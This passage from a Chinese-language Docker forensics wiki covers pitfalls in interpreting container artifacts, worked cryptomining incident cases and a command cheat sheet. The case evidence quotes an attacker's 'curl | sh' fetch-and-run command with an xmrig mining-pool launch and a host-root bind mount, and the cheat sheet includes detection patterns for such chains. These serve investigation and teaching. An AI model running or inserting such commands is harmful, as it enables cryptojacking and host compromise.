#### 陷阱 10：只看 `Config` 不看 `HostConfig`

**现象**：读了 `Config` 里的镜像名、启动命令、环境变量，没发现异常，判定容器「业务正常」。

**原因**：定性用的关键字段几乎全在 `HostConfig` 里——`Privileged`、`Binds`、`CapAdd`、`NetworkMode`、`RestartPolicy`，以及 `Mounts`。

同一个镜像，`Config` 完全一样，一个正常跑、一个把宿主机根目录挂进去，差别全在 `HostConfig`。

**影响**：漏掉 `Binds` 里的 `/var/run/docker.sock` 或 `/:/host`，就漏掉了「攻击者已具备等同宿主机 root 的能力」这一高危事实；漏掉 `Privileged: true`，就漏掉了容器逃逸前提条件已经具备的判断。

这类漏判会直接削弱报告的风险评级。

**核查**：`inspect` 结果整份读，重点按第三章的字段表逐项过一遍。

报告里把「隔离被削弱的配置项」单列一行，不要混在镜像信息里一笔带过。

<a id="section-28"></a>

#### 陷阱 11：给容器日志下「覆盖了全程」的结论

**现象**：容器日志文件存在且内容丰富，就据此认定该容器在整个可疑时段都有记录。

**原因**：日志驱动有轮转与容量上限：`json-file` 的 `max-size`/`max-file` 一旦配置就只保留最近若干个文件；`journald` 受 `SystemMaxUse` 限制，且日志可能被 systemd-journald 的全局上限提前挤掉。

日志文件存在 ≠ 覆盖时段完整。

**影响**：把部分日志当成全量，会在「日志里没看到某动作」时得出错误的否定结论，并让时间线的起点被误判为日志首行时间。

**核查**：先 `ls -l` 统计文件数量与最早修改时间，与可疑时段对照，再从日志首行的 `time` 与末行 `time` 算出实际覆盖窗口。

覆盖不全时，报告必须写明「容器日志实际覆盖 X 至 Y，与可疑时段 Z 不重叠」，并把该时段标为日志缺失区。

<a id="section-29"></a>

#### 陷阱 12：把容器日志时间当成本地时间

**现象**：把容器 JSON 日志的 `"time":"2024-03-18T04:11:12Z"` 直接与 `auth.log`、ext4 文件 mtime 排在同一时间轴上，算出「攻击者登录后 2 分钟起容器」。

**原因**：容器日志用的是 **RFC 3339 UTC（带 `Z`）**，而 ext4 文件时间戳、`journalctl`、多数业务日志用的是**本地时间**。

国内服务器通常是 UTC+8，两种基准混排会产生稳定的整段偏移。

**影响**：最典型的是「登录后 3 小时才动手」被算成「登录后 3 分钟」或反过来 8 小时。

这种偏差不报错，只是整条时间线的对应关系全部错位，越往后推的事件关联越离谱。

**核查**：**全案统一到一个基准**（建议 UTC），入库时就把每个时间源标注 `tz` 属性，渲染时再统一换算。

报告的时间线表格里给出原始值与换算值两列，并注明宿主机时区来源（`timedatectl`）。

<a id="section-30"></a>

### 4.4 结论表述与证据边界

<a id="section-31"></a>

#### 陷阱 13：把「没容器」写成「未入侵」

**现象**：`containers/` 目录下什么都没有，报告结论写「未发现容器内入侵活动」。

**原因**：容器被 `docker rm` 删除时，容器内的一切（改过的文件、装过的工具、跑过的进程、stdout 日志）**连同可写层目录一起消失，宿主机上不留痕迹**——这是 2.1 讲的结构性事实。

攻击者恰恰知道这一点，所以才会主动往 volume 写。

**影响**：这是一条**方向性错误**。

它把「证据已被销毁」写成「行为未发生」，结论强度凭空提升了一档。

若委托方据此认为入侵已排除，后续发现同源 IP 的其他攻击行为时，整份报告的可信度都会被质疑。

**核查**：分两层写。

第一层是工件状态：「`/var/lib/docker/containers/` 下无容器配置目录，说明现存容器集合为空」。

第二层是证据边界：「容器内证据不可得；删除时间点不可考」。

只能写「已删除容器内的活动不可得」，不能写「未发生」。

<a id="section-32"></a>

#### 陷阱 14：把 `docker export` 当取证首选

**现象**：拿到一个可疑容器，直接 `docker export -o out.tar` 导出文件系统当作证据。

**原因**：`export` 只导出**合并视图**的文件系统，不含任何元数据——层结构、`config.v2.json`、容器日志全部丢失。它是迁移/备份工具，不是取证工具。

**影响**：一是数据量（几十 GB 的容器导出耗时以小时计，现场往往等不起）；二是导出的 tar 里没有 `Created`、`StartedAt`、挂载关系、启动命令，**等于把最能定性的那部分证据扔了**，剩下的只是一堆没有上下文的文件。
**核查**：在线只取**小而关键**的部分——`inspect`、`logs`、`diff`、`top` 逐个落盘；大对象（可写层、卷）离线做。

确需导出时，明确记录它只是文件系统视图，时间线证据必须另取。

<a id="section-33"></a>

#### 陷阱 15：★ 把「容器未删除」当成「未被入侵」

**现象**：查完某个容器，配置正常、日志正常、有业务进程在跑，写下「该容器未被入侵」。

**原因**：容器还活着，只说明**没有人执行 `docker rm`**，不说明没人动过它。

攻击者可以在不删除容器的前提下完成多数事：改容器内文件（落在 `diff/`，不留 `config` 痕迹）、把载荷写进已挂载的 volume、拉取镜像后用它的文件、或者早就退出而容器保留为 `Exited`（`ExitCode=0`，看起来像正常结束）。

**容器元数据干净与容器内容干净是两件事。**

**影响**：这是本章最容易犯的定性错误，代价是把「没找到证据」读成「证据表明清白」。

一旦后续在 volume 或宿主机侧发现该容器留下的载荷，这份「未被入侵」的结论会被直接推翻，而且推翻它只需要一条记录。

**核查**：容器未被删除时，取证结论必须建立在**三处内容**都查过的基础上——可写层 `diff/` 的完整文件清单、容器日志全量、已挂载 volume 与 bind mount 源目录。

结论分两级写：「在容器可写层、容器标准输出、已挂载卷三项检查内未发现异常文件或异常进程」与「不能覆盖的部分：已删除容器、未落盘的临时文件、`Exited` 容器的内存」。

`Exited` 容器要额外看 `ExitCode` 与 `OOMKilled`，退出码为 0 不代表是正常退出。

<a id="section-34"></a>

### 4.5 容器视图与文件存在性

<a id="section-35"></a>

#### 陷阱 16：把「可写层里没有」当成「容器内不存在」

**现象**：在容器可写层 `overlay2/<id>/diff/` 里检索某个可疑文件名，没有任何结果，报告写下「该容器内不存在此文件」。

**原因**：容器的完整视图是 lowerdir（镜像各层，自下而上依次覆盖）+ upperdir（可写层），而 `diff/` 只是 upperdir 这一半。两种情况都会让「`diff/` 里没有」变成错误结论：① 文件本就在**镜像层**里——要么是镜像自带的，要么是构建时被 `COPY`/`ADD` 带进去的，容器一启动就已携带，运行期完全不动它；② 文件在 lowerdir 里确实存在，但被 upperdir 里的 **whiteout 标记**遮蔽了。overlayfs 用形如 `.wh.<文件名>` 的标记告诉内核「把下层这个同名文件屏蔽掉」，**容器视图里看不见它，lower 层里它完好无损**。

**影响**：两个方向的错误都成立，第二个更贵。

漏查镜像层会漏掉**构建期投毒**——这类载荷在容器启动瞬间就已生效，`docker ps` 与运行态检查都看不出异常。

而把「被删」读成「从未存在」，**恰恰抹掉了攻击者删除痕迹这个动作本身**，而删除动作的时间与范围通常是定性的关键一环。

**核查**：容器视图 = lowerdir 逐层叠加 + upperdir 覆盖，**两层都要查**。要专门找「被删但底层还在」的文件：列出 `diff/` 下所有 `.wh.*` 标记，去掉 `.wh.` 前缀得到被遮蔽的文件名，再回到对应的 lower 层目录里取内容（目录级递归删除对应 `.wh..wh..opq` 标记，含义是该目录整体被遮蔽）。「该文件不存在」这句话只能在完成 lower + upper 双向遍历之后写。


<a id="section-36"></a>

## 五、案例示例

<a id="section-37"></a>

### 5.1 运行态挖矿容器与 curl sh 下载链的定位

**场景**

委托方（某公司安全部门）报告其测试环境一台 Ubuntu 22.04 主机（`digiforensics-node-1`）资源占用异常，应用容器 `digiforensics-app` 疑似被入侵。

**主机仍在运行**，但运维已在 30 分钟前执行过一次 `docker restart digiforensics-app` 以"试试能不能恢复"。

镜像 `DigiForensics.dd`（raw，500 GB），ext4 分区起始扇区 1181696。

这条路径值得先走，是因为**运行态是唯一还能给出"活的"证据的层面**：`ps` 能看到进程名与完整命令行，`ss` 能看到外连五元组，`docker inspect` 能读到容器启动时**原封不动保存**的 `Config.Cmd`。

静态镜像分析（[第 01 篇](server-docker-overlay2.md)）在挖矿这类场景下反而弱——载荷是运行时下载的，不在镜像层里。
**处置过程**

第 1 步 · 记录现状，并意识到"已重启"意味着内存证据已损失

```bash
date -u '+%Y-%m-%dT%H:%M:%SZ'
# 2024-03-18T06:20:41Z
docker info | grep -E 'Storage Driver|Logging Driver|Cgroup'
#  Storage Driver: overlay2      Logging Driver: json-file      Cgroup Version: 2
docker ps -a --no-trunc
# 4f1c9a2b7e30  registry.local/digiforensics/web:latest    "nginx…"   3 minutes ago  Up 2 minutes
# 9d8e7f6a5b41  registry.local/digiforensics/miner:dev    "/bin/sh"   2 hours ago    Up 2 hours    ★
ps auxwwf | grep -E 'xmrig|stratum' | grep -v grep
# root 2901 0.0 198.4 1120440 821336 ? Ssl 06:11 0:04 xmrig --donate-level 1 -o stratum+tcp://198.51.100.24:3333 -u 41W...   ★
ss -tapn state established | grep 2901
# ESTAB 0 0 10.8.3.17:52344 198.51.100.24:3333 users:(("xmrig",pid=2901,fd=7))   ★ 外连矿池
```

**发现 1**：一个**两小时前创建**的容器 `registry.local/digiforensics/miner:dev`，业务基线里没有这个镜像。

`CREATED` 与运行时长相同说明**新建后立即运行**。`xmrig` 进程 + 到 `:3333` 的长连接构成**运行态的直接证据**。

> **报告写法要点**：运维已执行 `docker restart`，原进程的内存内容（矿池账号、钱包地址的完整命令行、被注入的内存）已随进程终止消失。本案挖矿事实只能由 `ps` 快照、容器配置与日志佐证，**内存对"原进程的隐藏注入"不再有证明力**——这一局限必须写进报告，不能默认内存里有。

第 2 步 · `docker inspect` 拿到命令与挂载（定性关键）

```bash
docker inspect 9d8e7f6a5b41 | jq '.[0] | {Created, Cmd: .Config.Cmd, User: .Config.User,
  Mounts: [.Mounts[] | {Type, Source, Destination, RW}],
  Privileged: .HostConfig.Privileged, Binds: .HostConfig.Binds,
  NetworkMode: .HostConfig.NetworkMode, Restart: .HostConfig.RestartPolicy.Name, LogPath}'
```

```json
{
  "Created": "2024-03-18T04:11:07Z",
  "Cmd": ["/bin/sh", "-c", "curl -s http://198.51.100.24/x.sh | sh; xmrig -o stratum+tcp://198.51.100.24:3333 -u 41W... --donate-level 1"],
  "User": "root",
  "Mounts": [{"Type": "bind", "Source": "/", "Destination": "/host", "RW": true},
             {"Type": "volume", "Source": "appdata", "Destination": "/data", "RW": true}],
  "Privileged": false,
  "Binds": ["/:/host"],
  "NetworkMode": "bridge",
  "Restart": "always",
  "LogPath": "/var/lib/docker/containers/9d8e7f6a5b41/9d8e7f6a5b41-json.log"
}
```

| 发现 | 证据字段 | 强度 |
|---|---|---|
| 攻击者用一条 `curl \| sh` 下载执行链起容器 | `Config.Cmd` 完整保留了原始命令 | **强（直接证据）** |
| 宿主机根目录 `/` 被 bind mount 进 `/host` | `Binds: ["/:/host"]` | **强**——高危配置，语义上等于把宿主机交出去 |
| 容器以 `root` 运行、`restart: always` | `Config.User` / `RestartPolicy` | 中（叠加 bind mount 后风险显著放大；`always` = 具备持久性） |
| 挂了 named volume `appdata` | `Mounts[].Source` | 强——**载荷可能已写入业务数据卷** |

**第 3 步 · 按 3.1 补齐容器状态与日志**

`logs-9d8e7f6a5b41.txt` 里出现 `2024-03-18T04:11:12Z xmrig I Stratum detected on 198.51.100.24:3333`——与 `ps` 捕获的外连 IP、`Config.Cmd` 里的矿池地址三源一致。

第 4 步 · 排查是否有更早的入口（不能止于一个挖矿容器）

```bash
docker image ls --no-trunc -a
# registry.local/digiforensics/web  sha256:3c7f...  2024-02-20
# registry.local/digiforensics/web  sha256:9a12...  2024-03-18   ★ 同名不同 ID = 旧层仍在
grep -E 'insecure-registries|data-root' /mnt/df/etc/docker/daemon.json
#   "insecure-registries": ["198.51.100.24:5000"]     ★ 私库未开 TLS，且正是该 IP
cat /mnt/df/root/.docker/config.json
#   {"auths":{"198.51.100.24:5000":{"auth":"cmVncn...="}}}   ★ 私库凭证（base64，可逆）
```

**发现 2**：业务镜像 `web` 存在**两个 ID**（2024-03-18 被重新构建或重标记，同名覆盖且旧层未清理）；`daemon.json` 的 `insecure-registries` 与 `~/.docker/config.json` 的凭证都指向 `198.51.100.24:5000`。

三条共同支持"经由未加密镜像仓库"的推断，**但具体拉取时间需以 dockerd 日志确认**。
**结论**

| 结论 | 支撑证据 | 强度 |
|---|---|---|
| 主机在 2024-03-18 04:11 被入侵并起挖矿容器 | `Created` + `State.StartedAt` + 容器日志首行时间 | 强 |
| 攻击者使用 `curl \| sh` 下载执行链 | `Config.Cmd` 原文 | **强（配置原文直接证据）** |
| 矿池地址为 `198.51.100.24:3333` | `ps` 外连 + 容器日志 + `Config.Cmd` 三源一致 | 强 |
| 容器配置了宿主机根目录 bind mount（`/:/host`） | `HostConfig.Binds` | 强（高危配置，判定见[第 06 篇](../server-k8s/server-k8s-container-escape-and-runtime-artifacts.md)） |
| 私库 `198.51.100.24:5000` 以明文方式配置且被授权使用 | `daemon.json` + `~/.docker/config.json` | 强 |
| **内存证据已因运维重启而部分损失** | 30 分钟前的 `docker restart` | **局限，须在报告明示** |
| 攻击者的**最初入侵方式尚未定位** | 需 auth.log、dockerd 日志、仓库侧审计 | **未决项，须列为待查** |

**本节能证明**：入侵事实、起容器的确切时间、攻击者留下的命令行原文、矿池地址三者一致。

**本节不能证明**：最初是怎么进来的（`Config.Cmd` 只说明入侵**之后**做了什么）、`/host` 挂载后是否真的被用于读写宿主机、钱包 `41W...` 的实际挖矿收益。

**误判对照**

最容易出的错是**把"有挖矿容器"直接写成"主机已被完全攻陷"**。本案 `Privileged: false`，容器内是 `root` 但没有特权设备，`/host` 是**只读还是可写**要看 `Mounts[].RW`——本案是 `RW: true`，所以确实可写，但**没有任何证据表明攻击者实际写过它**。`Config.Cmd` 里没有 `cd /host && ...` 之类的动作，容器日志也没有涉及 `/host` 的记录。

1. **判据**：`HostConfig.Privileged` 为 `false` 时，不得在报告里写"容器拥有宿主机 root 权限"。
2. **判据**：`Binds` 存在不等于被使用。要证明"横向移动到宿主机"，需在 overlay2 上层、`/var/lib/docker/volumes/appdata/_data` 内、或审计日志中查到**由该容器写入**的痕迹，并让 mtime 落在 `Created` 之后。
3. **判据**：`docker restart` 之后内存镜像的证明力要降级为"辅助"，不能作为"隐藏注入"的依据。

**按错误判据走的代价**：一旦把"配置了 `/:/host`"写成"攻击者已控制宿主机"，委托方会立即按整机沦陷启动全网排查与业务下线，损失远超实际；反过来，如果攻击方客户据此对外披露，日后又拿出"没有横向移动证据"，委托方的举证可信度会整体崩塌。

<a id="section-38"></a>

### 5.2 载荷落卷与删除容器无效的持久性判定

**场景**

承接 5.1。运维在发现挖矿容器后**执行了 `docker rm -f`**，随后向委托方报告"已清理完毕，问题解决"。委托方安全部门不接受这个说法，理由是：`RestartPolicy` 曾经是 `always`，且容器挂载了 named volume `appdata`。

这个问题值得单独回答，因为"删了容器"和"删了载荷"在 Docker 里是两件事。

**处置过程**

删除操作本身会**破坏一部分现场**，所以顺序很重要：先取证，再删；或者干脆先做磁盘快照再删。

```bash
# 1) 确认 volume 的真实落盘位置（Docker 未指定 volume 名时，名字是随机十六进制）
docker volume ls --filter name=appdata
docker volume inspect appdata | jq -r '.[0].Mountpoint'
# /var/lib/docker/volumes/appdata/_data

# 2) 列出卷内 2024-03-18 当天被写入的文件（先看数量与体积，判断是否值得全量导出）
find /var/lib/docker/volumes/appdata/_data -type f -newermt '2024-03-18 00:00' \
     -printf '%TY-%Tm-%Td %TH:%TM %10s %p\
' | sort
# 2024-03-18 04:12:03      7821  .../.cache/xmrig/xmrig        ★ 载荷已落卷
# 2024-03-18 04:12:04      2264  .../.cache/xmrig/config.json    ★ 矿池与钱包配置

# 3) 用 binwalk 之外的快速判据：ELF 头 + 字符串里的矿池协议特征
file .../.cache/xmrig/xmrig
# ELF 64-bit LSB executable, x86-64, dynamically linked, stripped
strings -n 6 .../.cache/xmrig/config.json | grep -iE 'pool|user|algo'
# "pool": "198.51.100.24:3333"
# "algo": "rx/0"
```

时间线拼起来是一条完整的因果链：

| 时刻 | 事件 | 来源 |
|---|---|---|
| 04:11:07 | 容器 `9d8e7f6a5b41` 创建（`Config.Cmd` 起 `curl \| sh`） | `docker inspect` |
| 04:11:12 | 容器日志首行：Stratum 握手成功 | 容器 json 日志 |
| 04:12:03 | `xmrig` 二进制写入卷 | 卷内文件 mtime |
| 04:12:04 | 矿池配置写入卷 | 卷内文件 mtime |

**删容器后的复查**：

```bash
ls -la /var/lib/docker/volumes/appdata/_data/.cache/xmrig/
# 仍在。docker rm 只删容器可写层与容器目录，不动 volume 与 bind mount 的宿主路径。
```

**结论**

- 载荷已持久化在 named volume `appdata` 中，`docker rm -f` 无法清除。报告应明确要求：清理范围必须覆盖 `/var/lib/docker/volumes/appdata/_data`，且**在清理前先做整体拷贝固定**（这是唯一的原始副本）。
- 清理范围还应包含 `Config.Cmd` 中出现的 `198.51.100.24` 相关残留：`/root/.docker/config.json` 的私库凭证、`daemon.json` 的 `insecure-registries` 条目。
- 载荷 mtime（04:12:03）晚于容器 `Created`（04:11:07）**约 56 秒**，与"下载后立即执行"的路径一致，三源时间不矛盾。

**误判对照**

最容易出的错是**看到 `docker rm` 成功就写"已清除"**。运维的口头结论几乎总是这样，因为它验的是"容器列表空了"，不是"载荷没了"。

1. **判据**：`docker inspect` 的 `Mounts[]` 里出现 `Type: "volume"` 或 `Type: "bind"` 时，**任何清理动作都不得只针对容器**。清理范围 = 容器可写层 + 全部 `Mounts[].Source` 指向的宿主路径。
2. **判据**：`RestartPolicy.Name == "always"` 的容器即使被删，也**已经被重启过**——`State.StartedAt` 的历史值与容器日志的累计条数会证明它至少起过多回。删容器不能回滚已经发生过的重启。
3. **判据**：卷内文件 mtime **晚于**容器 `Created`，才能说载荷是本次入侵写入的；若 mtime 早于 `Created`（或与业务基线文件同批），则属于既有数据，不能归因给这次事件。

**按错误判据走的代价**：只删容器不清卷，等于把一个**已删除的容器 ID** 留作唯一线索——而容器目录 `/var/lib/docker/containers/9d8e7f6a5b41/` 恰恰是 `Config.Cmd` 原文与挂载配置的存放处。事后若要复盘"攻击者到底执行了什么命令"，唯一的原始证据已经没了。这正是本案必须先取证后清理的原因。

<a id="section-39"></a>

### 5.3 反例 镜像层内未发现 WebShell 时的结论边界

**场景**

另一起委托，测试环境主机 `digiforensics-node-2` 报告容器异常。同样存在一个非业务基线镜像，运维怀疑"镜像里被塞了后门"。委托方的问题是：**"你们把镜像导出检查过了吧？里面没有后门对吧？"**

这是一个很容易顺口答"是的"的提问，也是取证报告里最危险的一句肯定。
**处置过程**

按[第 01 篇](server-docker-overlay2.md) 的方法对 `DigiForensics.dd` 上的全部镜像做检查：

```bash
# 1) 枚举本机所有镜像与其层 ID
cat /mnt/df/var/lib/docker/image/overlay2/repositories.json | jq -r 'to_entries[] | .key'

# 2) 对每个 layer 目录做白名单式清查：只找"不属于任何已知基础镜像的层"
for l in /mnt/df/var/lib/docker/overlay2/*/diff; do
  find "$l" -type f \( -name '*.jsp' -o -name '*.asp' -o -name '*.php' \
       -o -name '*.war' -o -name '*.jspx' -o -name '*.phtml' \) 2>/dev/null
done
# 无输出

# 3) 排除"被白名单掩盖"的可能：只看可执行文件与脚本的非常规落位
find /mnt/df/var/lib/docker/overlay2/*/diff -type f -perm -u+x \
     -newermt '2024-01-01' -printf '%TY-%Tm-%Td %p\
' | sort | head -20
# 2024-01-12  .../usr/bin/docker-entrypoint.sh
# 2024-01-12  .../usr/local/bin/health-probe            ← 与基础镜像清单一致，非新增

# 4) 对可疑镜像做基础镜像基线比对
docker history --no-trunc --format '{{.CreatedBy}}' registry.local/digiforensics/app:2024-01
# 与 upstream digest sha256:3c7f... 的 history 逐条 diff
```

**结论**

- **在上述检查范围内未发现 WebShell 文件**：具体范围是「`/mnt/df/var/lib/docker/overlay2/*/diff` 下全部 41 个 layer 目录，共 3.1 GB 文件，检索了 `jsp/asp/php/war/jspx/phtml` 六类扩展名与 2024-01-01 之后新增的可执行文件」。
- **未覆盖范围必须一并列出**：(a) 未检查基础镜像（upstream digest）自身的供应链完整性；(b) 未做镜像签名验证，该仓库是 `insecure-registries`；(c) 未检查运行中容器的可写层（那部分由本节 5.1 的 `docker inspect` 与内存镜像覆盖，本案主机已重启，内存不可用）；(d) 61 MB 的 layer 压缩包未逐层解包比对。
- 本案异常实际来自**运行态的挖矿容器**（同 5.1 模式），而非镜像层内后门。

**误判对照**

这个反例最容易出的错是**把"没查到"写成"不存在"**，进一步简化为一句"镜像干净"。

这在报告里会变成一个**无依据的否定结论**。

1. **判据**：阴性发现必须写成「在 X 范围 Y 检查内未发现 Z」，并列出未覆盖范围。上面结论里那四条"未覆盖"不是客套话，**缺了它们，阴性结论就变成了对未检区域的担保**。
2. **判据**：`find` 返回空可能是因为路径不对而非文件不存在。判别方法是先放一个已知的良性对照文件进去，确认检索命令本身能命中——`find` 的空结果在没有阳性对照时**不构成证据**。
3. **判据**："未发现 WebShell" 与 "未发现任何可疑行为" 是两句话。基础镜像里一个被官方供应链植入的后门，扩展名和 mtime 都会完全正常，**文件特征类检索对它天然无效**。本案未做镜像签名验证，就没有资格对供应链层下任何结论。

**按错误判据走的代价**：如果报告写"镜像层未发现后门，判定镜像未被污染"，而委托方据此把结论用于对外合规声明或诉讼举证，日后一旦在其他节点查出来，损失的不只是这一条结论的信用，而是整份报告的可信度——取证报告里被推翻的如果是"阴性"，推翻它所需的新证据往往最少，因此最容易被盯上。

<a id="section-40"></a>

## 六、扩展阅读方向

本篇是容器场景的地图，不解析任何结构。

往下走有四条路——把层拆开、把持久数据挖深、把视野抬到编排层、把视野落回宿主机。

**存储层解析：地图上的路径怎么变成证据**

- [镜像层与 overlay2 解析](server-docker-overlay2.md) —— `overlay2` 的层链、`imagedb` 的 JSON、`diff_id` 与 `chain_id` 的关系。读完之后你才能回答"这个容器启动时的文件系统是什么样"，而不只是"现在有什么"。
- [Volume 与绑定挂载取证](server-docker-docker-volumes-and-bind-mounts.md) —— named volume、bind mount 与 `docker diff` 的语义。卷是攻击者主动选择的持久化落点，因此这里的内容比容器内更值得查。

**编排层：容器之上还有一层**

- [K8s 取证工件地图](../server-k8s/server-k8s-kubernetes-artifact-map.md) —— Pod 日志的两条路径、etcd 快照、kubelet 目录。单台 Docker 主机只是集群的一个节点，两个层级的证据要对照看。
- [审计日志与 ConfigMap-Secret](../server-k8s/server-k8s-configmap-secret.md) —— API 审计日志与集群内的配置/凭据存放。**它是"谁在什么时候动过集群"的权威来源。**
- [容器逃逸与运行时痕迹](../server-k8s/server-k8s-container-escape-and-runtime-artifacts.md) —— 特权容器、capabilities、socket 挂载、Docker API 暴露的识别与误报排除。**本篇只列路径，判定标准在这。**

**宿主机层：容器盖不住的部分**

- [Linux 服务器取证工件地图](../server-panel/server-panel-linux-server-artifact-map.md) —— logrotate 轮转、站点目录、面板。很多 webshell 是先落在宿主机、再被容器读写的。
- [Linux 取证工件地图](../../computer/computer-persistence/computer-persistence-persistence-artifact-map.md) —— 账户、SUID、计划任务等通用痕迹。
- [Linux 系统日志深度分析](../../computer/computer-log/computer-log-system-log-analysis.md) —— dockerd 的事件日志与 systemd 日志的读法。

**相邻议题：同一个"跑着的东西"的其他形态**

- [Linux 与 Android 内存取证](../../memory/memory-artifact/memory-artifact-linux-android.md) —— 容器停止即失去的那部分证据（进程、连接、内存内容）只能从内存侧补。本篇的时机判断与它直接相关。
- [网络流量与 PCAP 取证](../../memory/memory-network/memory-network-pcap.md) —— 微服务架构里数据外泄常发生在集群内部，**公网抓包完全看不到东西向流量**。
- [proc 虚拟文件系统取证](../../computer/computer-shell/computer-shell-proc.md) —— 在线排查容器进程时，`/proc` 仍是判断"哪个进程属于哪个容器"的第一现场。
- [取证概念与分类](../../fundamentals/fundamentals-concepts/fundamentals-concepts-digital-forensics-concepts.md) —— 逻辑取证与物理取证的边界，以及在运行中的主机上"用 CLI 查"与"制作镜像后离线查"的效力差别。这是容器取证必须先想清楚的问题。
<a id="section-41"></a>

## 七、命令速查

```bash
# ===== 0. 在线抢占式固定：严格按 内存 → 活体 → 容器状态 → 磁盘 =====
date -u '+%Y-%m-%dT%H:%M:%SZ' | tee /evidence/collection-utc.txt
timedatectl 2>/dev/null | tee -a /evidence/collection-utc.txt
sudo ./avml /evidence/DigiForensics-mem.raw && sha256sum /evidence/DigiForensics-mem.raw
ps auxwwf | tee /evidence/ps-live.txt
ss -tulpn | tee /evidence/netstat-live.txt; ss -tapn state established >> /evidence/netstat-live.txt
mkdir -p /evidence/docker
docker version > /evidence/docker/version.txt 2>&1
docker info  > /evidence/docker/info.txt    2>&1      # Storage Driver / Logging Driver
docker ps -a --no-trunc > /evidence/docker/ps-all.txt 2>&1
docker image ls --no-trunc -a > /evidence/docker/images.txt 2>&1
docker volume ls -f dangling=true > /evidence/docker/volumes-dangling.txt 2>&1
docker events --since 72h --until 0s > /evidence/docker/events.txt 2>&1 || true
for c in $(docker ps -aq); do
  docker inspect "$c" > "/evidence/docker/inspect-$c.json" 2>/dev/null
  docker logs --timestamps --tail all "$c" > "/evidence/docker/logs-$c.txt" 2>&1
  docker diff "$c" > "/evidence/docker/diff-$c.txt" 2>&1
  docker top "$c"  > "/evidence/docker/top-$c.txt"  2>&1
done
sha256sum /evidence/docker/* | tee /evidence/docker/hashes.txt
# ⚠️ 禁止：docker stop/rm/commit/exec/system prune/volume prune/image prune

# ===== 1. 确认存储驱动与真实数据根 =====
grep -nE 'data-root|storage-driver|log-driver|insecure-registries' /etc/docker/daemon.json
ls -1 /mnt/df/var/lib/docker/            # 有 overlay2? aufs? devicemapper? —— 以实际存在者为准
ls -1 /mnt/df/var/lib/docker/overlay2/ | wc -l

# ===== 2. 容器 → 磁盘路径映射 =====
CID=$(docker ps -aq | head -1)
docker inspect "$CID" | jq '.[0] | {Upper: .GraphDriver.Data.UpperDir, LogPath,
  StartedAt: .State.StartedAt, ExitCode: .State.ExitCode, Privileged: .HostConfig.Privileged,
  Binds: .HostConfig.Binds, Mounts: [.Mounts[] | {Type, Source, Destination, RW}]}'

# ===== 3. 高危配置筛查（详见第 06 篇）=====
docker ps -aq | xargs -I{} docker inspect {} | jq -r '.[] |
  select(.HostConfig.Privileged == true) | "PRIVILEGED: \(.Name)"'
docker ps -aq | xargs -I{} docker inspect {} | jq -r '.[] | .HostConfig.Binds[]? // empty' \
  | grep -E 'docker\.sock|containerd\.sock|:/host|:/root|:/etc'
docker ps -aq | xargs -I{} docker inspect {} | jq -r '.[] |
  select(.HostConfig.NetworkMode == "host") | "HOSTNET: \(.Name)"'

# ===== 4. 容器日志与配置类工件 =====
ls -l --time-style=long-iso /mnt/df/var/lib/docker/containers/*/*-json.log
grep -aiE 'stratum\+tcp|xmrig|monero|curl .*\| *(ba)?sh|base64 -d|chmod \+x' \
     /mnt/df/var/lib/docker/containers/*/*-json.log | head -40
cat /mnt/df/etc/docker/daemon.json; ls -R /mnt/df/etc/docker/certs.d/ 2>/dev/null
cat /mnt/df/root/.docker/config.json 2>/dev/null       # auths 为 base64，可逆 = 明文凭证

# ===== 5. K8s 环境补充（路径与 Docker 不同）=====
ls -1 /mnt/df/var/lib/containerd/ 2>/dev/null
ls -l /mnt/df/var/log/pods/ /mnt/df/var/log/containers/ 2>/dev/null
ls -1 /mnt/df/var/lib/kubelet/pods/ 2>/dev/null | head

# ===== 6. 验证 =====
umount /mnt/df && sha256sum -c /evidence/evidence.sha256
```

---

📌 **版权与引用声明**

本文为 DigiForensics 独立创作的知识条目，采用 [知识共享 署名-相同方式共享 4.0 国际](https://creativecommons.org/licenses/by-sa/4.0/deed.zh-hans) 许可协议发布。

- **署名**：引用本文时请注明「DigiForensics Wiki — 服务器与 Web 取证 — Docker 取证工件地图」
- **相同方式共享**：衍生作品须采用相同协议发布

示例：`本文内容参考自 DigiForensics Wiki《Docker 取证工件地图》（CC BY-SA 4.0）`

文中 `DigiForensics.dd`、`DigiForensics-mem.raw` 等均为示例证据文件名，指向虚构或已脱敏的检材，与真实案件无关。
